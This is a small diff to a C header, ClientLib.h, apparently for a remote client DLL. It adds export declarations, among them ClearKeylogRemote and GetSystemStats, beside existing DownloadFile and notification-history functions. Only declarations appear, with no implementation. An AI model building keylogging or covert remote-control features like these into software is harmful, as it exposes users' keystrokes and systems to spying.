@@ -61,4 +61,6 @@ DLLEXPORT void GetNotificationHistory();
 // Thêm dòng này vào ClientLib.h
 DLLEXPORT void DownloadFile(const char* remotePath, const char* localPath);
 
+DLLEXPORT void ClearKeylogRemote();
+DLLEXPORT const char* GetSystemStats();
 #endif // CLIENTLIB_H
